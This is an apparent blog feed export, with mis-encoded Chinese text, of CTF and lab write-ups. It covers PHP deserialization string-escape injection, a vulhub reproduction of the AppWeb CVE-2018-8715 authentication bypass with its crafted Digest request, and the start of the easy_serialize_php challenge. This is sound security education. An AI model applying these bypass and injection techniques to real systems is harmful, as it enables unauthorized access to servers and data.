<p><strong>ç»†èŠ‚</strong>ï¼šæ›¿æ¢ä¹‹å‰æˆ‘ä»¬çš„è¾“å…¥çš„å¯†ç ä¸º111ï¼Œåªæœ‰3ä½æ•°ï¼Œå› æ­¤æˆ‘ä»¬ç¼©è¿›ä¸²çš„é•¿åº¦åªæœ‰22ï¼Œè€Œæ›¿æ¢ä¸ºç›®æ ‡å­ä¸²åï¼Œâ€œpasswordâ€çš„é•¿åº¦ä¸º42ï¼Œæ­¤æ—¶çš„ç¼©è¿›ä¸²é•¿åº¦ä¸º23ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æœ‰23ä¸ªadminã€‚æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;</span>, <span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>); </span><br><span class="line">var_dump(unserialize(filter(<span class="variable">$a_ser</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ç»“æœä¸ºï¼š</span><br><span class="line"><span class="keyword">object</span>(User)<span class="comment">#2 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;username&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">115</span>) <span class="string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">42</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="string">&quot;password&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;123&quot;</span></span><br><span class="line">  [<span class="string">&quot;vip&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="æ€»ç»“">5.3 æ€»ç»“</h2>
<p>ä¸¤ç§æƒ…å†µæ˜¯ä¸ä¸€æ ·çš„ï¼Œå‰è€…æ˜¯æŠŠç›®æ ‡å­ä¸²å†™åœ¨ç¬¬ä¸€ä¸ªå˜é‡ï¼Œç„¶åè®©ç¬¬ä¸€ä¸ªå˜é‡å˜é•¿ï¼ŒæŒ¤èµ°åŸå…ˆçš„ç¬¬äºŒä¸ªå˜é‡ï¼Œè®©ç›®æ ‡å­ä¸²å æ®ç¬¬äºŒå˜é‡çš„ä½ç½®ä»è€Œè¢«ååºåˆ—åŒ–ã€‚è€Œåè€…æ˜¯æŠŠç›®æ ‡å­ä¸²å†™åœ¨ç¬¬äºŒå˜é‡ï¼Œç„¶åè®©ç¬¬ä¸€å˜é‡é•¿åº¦å˜çŸ­ï¼Œå°†[[#^184190|ç¼©è¿›ä¸²]]ç¼©è¿›åˆ°ç¬¬ä¸€å˜é‡é‡Œé¢ï¼Œç„¶åæŠŠç›®æ ‡å­ä¸²å æ®ç¬¬äºŒå˜é‡çš„ä½ç½®ä»è€Œè¢«ååºåˆ—åŒ–ã€‚</p>
<p>ä¸¤è€…éƒ½è¦æ³¨æ„ï¼š<strong>é—­åˆ</strong>ï¼›</p>
<p>åè€…è¿˜éœ€è¦æ³¨æ„</p>
<ol type="1">
<li>ç¼©è¿›ä¸²é•¿åº¦çš„å˜åŒ–</li>
<li>ä¸èƒ½å¤Ÿæ­£å¥½å°†ç¼©è¿›ä¸²ç¼©åˆ°å‰ä¸€ä¸ªå˜é‡çš„æƒ…å†µ</li>
</ol>
<p>bugku_newphpè¿ç”¨åˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ã€‚</p>
<h1 id="å±æ€§ä¸­å«æœ‰æ•°ç»„è¯¥å¦‚ä½•ååºåˆ—åŒ–">6 å±æ€§ä¸­å«æœ‰æ•°ç»„è¯¥å¦‚ä½•ååºåˆ—åŒ–</h1>
<p>ç¼–å†™å¦‚ä¸‹æµ‹è¯•ä»£ç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span> = <span class="keyword">Array</span>(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> Test1;</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> Test2;</span><br><span class="line">print_r(serialize(<span class="variable">$test1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">print_r(serialize(<span class="variable">$test2</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>ç»“æœä¸ºï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Test1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">11</span>:<span class="string">&quot;hello world&quot;</span>;&#125;&#125;  </span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Test2&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;hello world&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>å› æ­¤ï¼Œå¦‚æœéœ€è¦åœ¨åºåˆ—åŒ–ä¸­æäº¤æ•°ç»„ï¼Œéœ€è¦æ³¨æ„è¿™ä¸€ç‚¹ï¼Œä¸ä»…éœ€è¦é—­åˆåŒå¼•å·ï¼Œè¿˜è¦æŠŠ<code>&#123;&#125;</code>ä¹Ÿç»™é—­åˆäº†ã€‚</p>
<p>ä¾‹é¢˜ï¼š<a href="0CTF%202016%20piapiapia.md">0CTF 2016 piapiapia</a></p>
<h1 id="åºåˆ—åŒ–åçš„å±æ€§é¡ºåº">7 åºåˆ—åŒ–åçš„å±æ€§é¡ºåº</h1>
<p>ç¼–å†™ä»£ç æµ‹è¯•ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> profile;</span><br><span class="line"><span class="variable">$p</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">print_r(<span class="variable">$p</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>ç»“æœä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;profile&quot;:4:&#123;s:5:&quot;phone&quot;;s:1:&quot;1&quot;;s:5:&quot;email&quot;;s:1:&quot;2&quot;;s:8:&quot;nickname&quot;;s:1:&quot;3&quot;;s:5:&quot;photo&quot;;s:1:&quot;4&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœå°†å±æ€§é¢ å€’ä¸€ä¸‹ï¼Œå…¶ä½™ä¸å˜ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>å¾—åˆ°çš„ç»“æœå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;profile&quot;:4:&#123;s:5:&quot;photo&quot;;s:1:&quot;4&quot;;s:8:&quot;nickname&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:1:&quot;2&quot;;s:5:&quot;phone&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>ç»“è®º</strong>ï¼šä»ä»¥ä¸Šå®éªŒå¯ä»¥çœ‹å‡ºï¼Œç¼–å†™ç±»çš„æ—¶å€™å±æ€§çš„å…ˆåé¡ºåºå°±æ˜¯åºåˆ—åŒ–åå­—ç¬¦ä¸²ä¸­å±æ€§çš„å…ˆåé¡ºåºã€‚</p>
<p>ä¾‹é¢˜ï¼š<a href="0CTF%202016%20piapiapia.md">0CTF 2016 piapiapia</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHPååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>å¤ç°ï¼šAppWebè®¤è¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2018-8715ï¼‰</title>
    <url>/2022/03/22/%E5%A4%8D%E7%8E%B0%EF%BC%9AAppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
    <content><![CDATA[<p>ä¸ªäººçš„æ¼æ´å¤ç°ç»ƒä¹ ï¼Œè¯·å¤šæ‰¹è¯„ï¼</p>
<span id="more"></span>
<h1 id="æ¼æ´ä¿¡æ¯">æ¼æ´ä¿¡æ¯</h1>
<p>AppWebæ˜¯Embedthis Software LLCå…¬å¸è´Ÿè´£å¼€å‘ç»´æŠ¤çš„ä¸€ä¸ªåŸºäºGPLå¼€æºåè®®çš„åµŒå…¥å¼Web Serverã€‚ä»–ä½¿ç”¨C/C++æ¥ç¼–å†™ï¼Œèƒ½å¤Ÿè¿è¡Œåœ¨å‡ ä¹å…ˆè¿›æ‰€æœ‰æµè¡Œçš„æ“ä½œç³»ç»Ÿä¸Šã€‚å½“ç„¶ä»–æœ€ä¸»è¦çš„åº”ç”¨åœºæ™¯è¿˜æ˜¯ä¸ºåµŒå…¥å¼è®¾å¤‡æä¾›Web Applicationå®¹å™¨ã€‚</p>
<p>AppWebå¯ä»¥è¿›è¡Œè®¤è¯é…ç½®ï¼Œå…¶è®¤è¯æ–¹å¼åŒ…æ‹¬ä»¥ä¸‹ä¸‰ç§ï¼š</p>
<ul>
<li>basic ä¼ ç»ŸHTTPåŸºç¡€è®¤è¯</li>
<li>digest æ”¹è¿›ç‰ˆHTTPåŸºç¡€è®¤è¯ï¼Œè®¤è¯æˆåŠŸåå°†ä½¿ç”¨Cookieæ¥ä¿å­˜çŠ¶æ€ï¼Œè€Œä¸ç”¨å†ä¼ é€’Authorizationå¤´</li>
<li>form è¡¨å•è®¤è¯</li>
</ul>
<p>å…¶7.0.3ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œå¯¹äºdigestå’Œformä¸¤ç§è®¤è¯æ–¹å¼ï¼Œå¦‚æœç”¨æˆ·ä¼ å…¥çš„å¯†ç ä¸º<code>null</code>ï¼ˆä¹Ÿå°±æ˜¯æ²¡æœ‰ä¼ é€’å¯†ç å‚æ•°ï¼‰ï¼Œappwebå°†å› ä¸ºä¸€ä¸ªé€»è¾‘é”™è¯¯å¯¼è‡´ç›´æ¥è®¤è¯æˆåŠŸï¼Œå¹¶è¿”å›sessionã€‚</p>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<ul>
<li><a href="https://ssd-disclosure.com/index.php/archives/3676">https://ssd-disclosure.com/index.php/archives/3676</a></li>
</ul>
<p>è·¯å¾„ï¼š</p>
<ul>
<li><code>vulhub-master/appweb/CVE-2018-8715</code></li>
</ul>
<p>å¯åŠ¨ç¯å¢ƒï¼š</p>
<ul>
<li><code>sudo docker-compose up -d</code></li>
<li>è¾“å…¥ <code>http://ip:8080</code> å³å¯è®¿é—®</li>
</ul>
<p>å‰æï¼š</p>
<ul>
<li>å·²çŸ¥æŸä¸ªç”¨æˆ·åä¸º <code>admin</code></li>
</ul>
<h1 id="å¤ç°">å¤ç°</h1>
<p>ç›´æ¥è®¿é—®ç¯å¢ƒå‘ç°éœ€è¦ç™»å½• <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322092115.png" /></p>
<p>å¦‚æœéšä¾¿è¾“å…¥ç”¨æˆ·åå’Œå¯†ç åˆ™ä¼šæ˜¾ç¤º <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322093702.png" /></p>
<p>è¾“å…¥ç”¨æˆ·å <code>admin</code> ç„¶åæŠ“åŒ…ï¼Œä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.100.16:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Digest username=&quot;admin&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>ï¼ˆæœ€åä¸¤ä¸ªç©ºè¡Œå¾ˆé‡è¦ï¼ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094537.png" /></p>
<p>è·å¾—cookieï¼ˆç»è¿‡æµ‹è¯•ï¼Œæ¯å‘ä¸€æ¬¡ä¸Šè¿°çš„æ•°æ®åŒ…ï¼Œsessionçš„å€¼å°±ä¼š+1ï¼Œå¹¶ä¸”åé¢ä¹Ÿä¼šæœ‰æ‰€å˜åŒ–ï¼‰</p>
<ul>
<li><code>-http-session-=10::http.session::e0fff8835e6f7cfd1848635e08ecb006</code></li>
</ul>
<p>å†æ¬¡è¾“å…¥ <code>admin</code> ç„¶åæŠ“åŒ…ï¼Œè®¾ç½® cookie å­—æ®µã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094645.png" /></p>
<p>æˆåŠŸç™»å½• <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094704.png" /></p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>AppWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>å®‰æ´µæ¯ 2019 easy_serialize_php</title>
    <url>/2022/04/09/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_serialize_php/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5Bå®‰æ´µæ¯%202019%5Deasy_serialize_php">easy_serialize_php</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ä¹‹åï¼Œç‚¹å‡»<code>source_code</code>ï¼Œå‡ºç°å¦‚ä¸‹æºç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p>
<p>ç»è¿‡æç¤ºï¼Œå…ˆ<code>?f=phpinfo</code>æŸ¥çœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆä¿¡æ¯</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409200107.png" /></p>
<p>æƒ³å¿…è¿™ä¸ªæ–‡ä»¶è‚¯å®šä¸flagæœ‰å…³ã€‚</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>ä»ä»£ç æ¥çœ‹ï¼Œæˆ‘ä»¬åº”è¯¥éœ€è¦é€šè¿‡<code>echo file_get_contents(base64_decode($userinfo['img']));</code>è¯»å–flagï¼Œé‚£ä¹ˆ<code>f</code>çš„å€¼å°±æ˜¯<code>show_image</code>ã€‚</p>
<p>ç°åœ¨å°±æ˜¯å¦‚ä½•è®©<code>_SESSION['img']=flagæ–‡ä»¶</code>ã€‚å¦‚æœä¼ å…¥<code>img_path</code>å‚æ•°ï¼Œé‚£ä¹ˆå°±ä¼šç»è¿‡<code>sha1()</code>ï¼Œå³ä½¿æˆ‘ä»¬è¾“å…¥çš„æ˜¯flagæ–‡ä»¶åï¼Œä¹Ÿä¼šå˜æˆhashå€¼ä»è€Œæ— æ³•è¯»å–ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ä¼ å…¥<code>img_path</code>ã€‚é‚£ä¹ˆæ­¤æ—¶çš„<code>_SESSION['img']=guest_img.png</code>ã€‚</p>
<p>é‚£éœ€è¦æ€ä¹ˆåšæ‰èƒ½å°†å€¼å˜æˆæˆ‘ä»¬æƒ³è¦çš„å€¼å‘¢ï¼Ÿè¿™é‡Œå°±æ¶‰åŠåˆ°äº†<strong>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</strong>ã€‚</p>
<p>å…ˆä»‹ç»ä»¥ä¸‹<code>extract()</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šå¯¼è‡´å˜é‡è¦†ç›–æ¼æ´ï¼Œè¿™ä¹Ÿæ˜¯æœ¬é¢˜çš„è€ƒç‚¹ä¹‹ä¸€ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>]=<span class="string">&#x27;show_image&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬é€šè¿‡è¯¥å‡½æ•°ï¼ŒPOSTæ–¹å¼ä¼ å…¥å¦‚ä¸‹ä¿¡æ¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flag&amp;_SESSION[function]=flag</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆæ­¤æ—¶å˜é‡å°±ä¼šè¢«è¦†ç›–ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>]=<span class="string">&#x27;flag&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸">ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</h2>
<p>å…¶å®æœ‰ä¸¤ç§æƒ…å†µï¼Œæœ¬é¢˜æ¶‰åŠåˆ°çš„æ˜¯<strong>å­—ç¬¦ä¸²å˜å°‘</strong>çš„æƒ…å†µã€‚</p>
<p>æ­£å¸¸æƒ…å†µä¸‹æƒ…å†µï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>]=<span class="string">&#x27;show_image&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;guest_img.png&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ç»“æœï¼š</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;show_image&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;guest_img.png&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>ä¸Šé¢çš„å­—ç¬¦ä¸²ä¹Ÿèƒ½å¤Ÿé€šè¿‡ååºåˆ—åŒ–è½¬ä¸ºæ•°ç»„ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409202554.png" /></p>
<p>è®¾æƒ³å¦‚ä¸‹çš„å­—ç¬¦ä¸²èƒ½å¦é€šè¿‡ååºåˆ—åŒ–è½¬ä¸ºæ•°ç»„ï¼Ÿå¦‚æœå¯ä»¥ï¼Œæ•°ç»„çš„å€¼ä¸ºä»€ä¹ˆï¼Ÿ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:33:&quot;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;s:3:&quot;hdf&quot;;s:3:&quot;zzf&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409202910.png" /></p>
<p>è™½ç„¶å­—ç¬¦ä¸²ä¸­<code>s:4:"user";s:33:"";</code>33åé¢çš„åŒå¼•å·ä¸­åº”è¯¥å­˜åœ¨33ä¸ªå­—ç¬¦ï¼Œæ‰æ»¡è¶³åºåˆ—åŒ–çš„è§„å¾‹ã€‚æŸ¥çœ‹ç»“æœå‘ç°ï¼Œ<code>function</code>è¿™ä¸ªé”®ä¸è§äº†ï¼Œè€Œå¤šäº†ä¸€ä¸ª<code>hdf</code>çš„é”®ã€‚</p>
<p>è§£é‡Šï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:33:&quot;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;s:3:&quot;hdf&quot;;s:3:&quot;zzf&quot;;&#125;</span><br><span class="line"></span><br><span class="line">ä»33åçš„ç¬¬ä¸€ä¸ªåŒå¼•å·ä¹‹åå–33ä¸ªå­—ç¬¦ï¼š&quot;;s:8:&quot;function&quot;;s:10:&quot;show_imageï¼Œè¿™33ä¸ªå­—ç¬¦æ­£å¥½è¢«ä¸€å¯¹åŒå¼•å·åŒ…æ‹¬ï¼Œå› æ­¤ï¼Œç³»ç»Ÿä¼šè®¤ä¸ºè¿™å°±æ˜¯userçš„å€¼ã€‚ç„¶ååé¢çš„s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;æ­£å¥½ä¹Ÿæ»¡è¶³åºåˆ—hè§„å¾‹ï¼Œå› ä¸ºè¿™ä¸ªæ•°ç»„æœ‰3ä¸ªå€¼ï¼Œæ‰€ä»¥s:3:&quot;hdf&quot;;s:3:&quot;zzf&quot;;ä¹Ÿæˆä¸ºäº†æ•°ç»„çš„é”®å€¼ã€‚</span><br></pre></td></tr></table></figure></p>
